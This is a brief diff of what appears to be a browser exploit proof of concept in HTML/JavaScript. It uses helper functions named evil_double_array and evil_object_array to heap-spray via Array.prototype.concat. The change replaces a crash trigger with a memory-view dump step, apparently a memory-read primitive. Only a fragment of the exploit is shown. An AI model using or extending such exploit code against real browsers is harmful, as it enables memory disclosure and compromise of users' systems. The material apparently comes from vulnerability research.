@@ -150,9 +150,8 @@ function evil_object_array(len) {
     return w;
 }
 
-
 var sprayer = Array.prototype.concat.call(evil_double_array(0x1000));
-var crasher = Array.prototype.concat.call(evil_object_array(256));
-
+var view = MemView(sprayer);
+view.dumpmem();
 </script>
 </html>
